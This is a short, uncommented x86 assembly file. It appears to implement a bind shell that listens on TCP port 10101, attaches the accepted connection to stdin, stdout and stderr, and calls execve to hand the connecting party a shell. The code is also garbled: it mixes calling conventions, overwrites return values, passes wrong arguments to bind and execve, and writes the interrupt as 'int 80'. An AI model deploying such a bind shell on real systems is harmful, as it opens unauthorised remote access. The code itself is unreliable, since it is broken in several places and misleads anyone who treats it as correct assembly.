.section .bss
  sin: .space 12  

.section .data
  sock: .long 0    
  fd: .long 0   

.section .text
  .global main

main:
    push AF_INET
    push SOCK_STREAM
    push IPPROTO_TCP
    call socket
    mov eax, socket 

    mov ebx, eax  
    mov eax, AF_INET
    mov [sin + 0], eax

    mov ecx, 10101 
    call htons
    mov [sin + 4], eax

    mov eax, ebx 
    mov ebx, sin
    mov ecx, 12 
    call bind

    mov eax, ebx  
    mov ecx, 1
    call listen

    mov eax, ebx  
    mov ebx, NULL
    mov ecx, NULL
    call accept
    mov edx, eax

    mov eax, edx
    mov ebx, 0 
    call dup2

    mov eax, edx
    mov ebx, 1 
    call dup2

    mov eax, edx
    mov ebx, 2 
    call dup2

    mov ebx, [esp + 4] 
    push 0 
    call execve

    mov eax, 1
    mov ebx, 0
    int 80


